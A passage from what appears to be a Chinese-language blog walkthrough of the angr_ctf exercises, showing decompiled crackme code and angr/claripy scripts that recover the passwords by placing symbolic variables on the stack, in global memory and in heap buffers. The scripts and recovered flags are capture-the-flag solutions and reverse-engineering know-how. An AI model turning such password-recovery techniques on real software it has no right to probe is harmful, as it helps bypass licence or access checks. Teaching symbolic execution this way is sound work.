punctuation">(</span>path_to_binary<span class="token punctuation">)</span>    <span class="token comment"># 起始地址就是第一个参数被压入栈中的地址</span>    start_address <span class="token operator">=</span> <span class="token number">0x08048697</span>    initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>    <span class="token comment">#　由于要对栈做操作，需要先将esp指向ebp</span>    initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebp <span class="token operator">=</span> initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp    <span class="token comment"># 构建两个位向量，即符号变量，同样是３２位</span>    passwd_size_in_bits <span class="token operator">=</span> <span class="token number">32</span>    password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password0'</span><span class="token punctuation">,</span> passwd_size_in_bits<span class="token punctuation">)</span>    password1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password1'</span><span class="token punctuation">,</span> passwd_size_in_bits<span class="token punctuation">)</span>    <span class="token comment"># 下面需要将符号变量注入栈中，为此需要先腾出两个变量的空间，即2*4=8字节</span>    padding_length_in_bytes <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span><span class="token number">4</span>  <span class="token comment"># :integer</span>    initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp <span class="token operator">-=</span> padding_length_in_bytes    <span class="token comment"># 将变量压入栈中</span>    initial_state<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>password0<span class="token punctuation">)</span>  <span class="token comment"># :bitvector (claripy.BVS, claripy.BVV, claripy.BV)</span>    initial_state<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>password1<span class="token punctuation">)</span>  <span class="token comment"># :bitvector (claripy.BVS, claripy.BVV, claripy.BV)</span>    <span class="token comment"># 下面的步骤就和寄存器的部分一样了</span>    simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        solution0 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">)</span>        solution1 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password1<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Success, flag is: &#123;&#125; &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution0<span class="token punctuation">,</span> solution1<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token comment">#</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># basic()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210502132837.png" alt=""></p><h2 id="05-angr-symbolic-memory"><a href="#05-angr-symbolic-memory" class="headerlink" title="05_angr_symbolic_memory"></a>05_angr_symbolic_memory</h2><p>照例查看一下反编译的源码：</p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-Ch]</span>  <span class="token function">memset</span><span class="token punctuation">(</span>user_input<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x21u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter the password: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%8s %8s %8s %8s"</span><span class="token punctuation">,</span> user_input<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_9FD92A8<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_9FD92B0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_9FD92B8<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">31</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">167613088</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">complex_function</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">167613088</span><span class="token punctuation">)</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>user_input<span class="token punctuation">,</span> <span class="token string">"FINYOEXAGBOWGBBJRUCGWNQJZNFZTPPQ"</span><span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Good Job."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> __cdecl <span class="token function">complex_function</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token operator">&lt;=</span> <span class="token number">64</span> <span class="token operator">||</span> a1 <span class="token operator">></span> <span class="token number">90</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">9</span> <span class="token operator">*</span> a2 <span class="token operator">+</span> a1 <span class="token operator">-</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>程序对输入8字节数据经过32次循环变换，最后取前20位与指定字符串比较，同样地，我们需要找一个“空降”位置，为了不影响结果，该位置要在<code>scanf</code>之后，</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210502145422.png" alt=""></p><p>我们将初始化的状态定在<code>scanf</code>执行之后，<code>080485FE</code>是<code>esp</code>腾出空间给4个8字节变量，因此，选择<code>080485FE</code>或者<code>08048601</code>作为起始地址都是可以的。</p><p>接着因为我们需要修改内存中的数据，通过双击<code>user_input</code>变量查看输入的数值被存储到了哪里，结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210502143634.png" alt=""></p><p>可以看到在<code>bss</code>段中，四个变量顺序存储（间隔为8字节），<code>user_input</code>起始地址<code>09FD92A0</code>就是我们要“空降”的位置。<code>angr</code>允许通过操作内存，插入符号变量，主要通过<code>memory</code>的两个接口（单位为<code>bytes</code>）：</p><ul><li><code>load(addr,...)</code>: 读取指定地址的内存</li></ul><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">load</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> condition<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> fallback<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> add_constraints<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>       endness<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> inspect<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> disable_actions<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> ret_on_segv<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Loads size bytes from dst.        :param addr:             The address to load from.         :param size:            The size (in bytes) of the load.         :param condition:       A claripy expression representing a condition for a conditional load.        :param fallback:        A fallback value if the condition ends up being False.         :param add_constraints: Add constraints resulting from the merge (default: True).        :param action:          A SimActionData to fill out with the constraints.        :param endness:         The endness to load with.     """</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><ul><li><code>store(addr, ...)</code>: 向指定内存写入数据</li></ul><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">store</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> data<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> condition<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> add_constraints<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> endness<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>              inspect<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> priv<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> disable_actions<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token string">""</span>"        Stores content into memory<span class="token punctuation">.</span>        <span class="token punctuation">:</span>param addr<span class="token punctuation">:</span>        A claripy expression representing the address to store at<span class="token punctuation">.</span>         <span class="token punctuation">:</span>param data<span class="token punctuation">:</span>        The data to store <span class="token punctuation">(</span>claripy expression <span class="token keyword">or</span> something convertable to a claripy expression<span class="token punctuation">)</span><span class="token punctuation">.</span>        <span class="token punctuation">:</span>param size<span class="token punctuation">:</span>        A claripy expression representing the size of the data to store<span class="token punctuation">.</span> <span class="token comment">#大小</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>下面是完整的题解，我在必要的地方添加了注释，帮助理解</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path_to_binary <span class="token operator">=</span> <span class="token string">'05_angr_symbolic_memory'</span>    project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>    <span class="token comment"># 初始化状态位置，在scanf函数之后的两个均可</span>    start_address <span class="token operator">=</span> <span class="token number">0x080485FE</span>    initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>    <span class="token comment"># 注意这次输入的数据是８字节的，因此符号变量的位数是8*8=64</span>    passwd_size_in_bits <span class="token operator">=</span> <span class="token number">8</span><span class="token operator">*</span><span class="token number">8</span>    password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password0'</span><span class="token punctuation">,</span> passwd_size_in_bits<span class="token punctuation">)</span>    password1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password1'</span><span class="token punctuation">,</span> passwd_size_in_bits<span class="token punctuation">)</span>    password2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password2'</span><span class="token punctuation">,</span> passwd_size_in_bits<span class="token punctuation">)</span>    password3 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password3'</span><span class="token punctuation">,</span> passwd_size_in_bits<span class="token punctuation">)</span>    <span class="token comment"># 要注入符号变量的位置，即输入变量在内存中的地址</span>    password0_address <span class="token operator">=</span> <span class="token number">0x09FD92A0</span>    initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>password0_address<span class="token punctuation">,</span> password0<span class="token punctuation">)</span>    <span class="token comment">#　由于4个变量是连续存储，直接按8字节叠加即可</span>    initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>password0_address <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">,</span> password1<span class="token punctuation">)</span>    initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>password0_address <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">,</span> password2<span class="token punctuation">)</span>    initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>password0_address <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">,</span> password3<span class="token punctuation">)</span>    <span class="token comment"># 后面与之前一样</span>    simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token comment"># cast_to=bytes 是将原本8字节存储数据按照bytes显示，最后decode转换成普通字符串</span>        solution0 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        solution1 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password1<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        solution2 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password2<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        solution3 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password3<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Success, flag is: &#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution0<span class="token punctuation">,</span> solution1<span class="token punctuation">,</span> solution2<span class="token punctuation">,</span> solution3<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210502150212.png" alt=""></p><h2 id="06-angr-symbolic-dynamic-memory"><a href="#06-angr-symbolic-dynamic-memory" class="headerlink" title="06_angr_symbolic_dynamic_memory"></a>06_angr_symbolic_dynamic_memory</h2><p>本题和上题相似，只不过不再由堆栈分配内存，而是<code>molloc</code>动态分配，先看下源码：</p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [esp-10h] [ebp-1Ch]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-Ch]</span>  buffer0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">9u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  buffer1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">9u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>buffer0<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">9u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>buffer1<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">9u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter the password: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%8s %8s"</span><span class="token punctuation">,</span> buffer0<span class="token punctuation">,</span> buffer1<span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v3 <span class="token operator">=</span> <span class="token operator">&amp;</span>buffer0<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">*</span>v3 <span class="token operator">=</span> <span class="token function">complex_function</span><span class="token punctuation">(</span>buffer0<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    v4 <span class="token operator">=</span> <span class="token operator">&amp;</span>buffer1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">*</span>v4 <span class="token operator">=</span> <span class="token function">complex_function</span><span class="token punctuation">(</span>buffer1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>buffer0<span class="token punctuation">,</span> <span class="token string">"ZTWVXHOA"</span><span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>buffer1<span class="token punctuation">,</span> <span class="token string">"HHPPETFV"</span><span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Good Job."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">free</span><span class="token punctuation">(</span>buffer0<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">free</span><span class="token punctuation">(</span>buffer1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> __cdecl <span class="token function">complex_function</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token operator">&lt;=</span> <span class="token number">64</span> <span class="token operator">||</span> a1 <span class="token operator">></span> <span class="token number">90</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">13</span> <span class="token operator">*</span> a2 <span class="token operator">+</span> a1 <span class="token operator">-</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>程序动态创建两个9字节的缓冲区，输入两个字符串，并以8字节存储输入缓冲区，对缓冲区中的数据进行<code>complex_function</code>变换，将变换后的字符串与指定的两个字符串比较。</p><p>先确定一下我们需要开始的地址（即空降位置），找到<code>scanf</code>函数，选择下面第一个或第二个地址即可：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210503104737.png" alt=""></p><p>记录地址<code>08048696</code>，这是之后的<code>start_address</code>，由于我们直接从该处模拟执行，因此前面的代码不会被执行，即</p><div class="code-wrapper"><pre 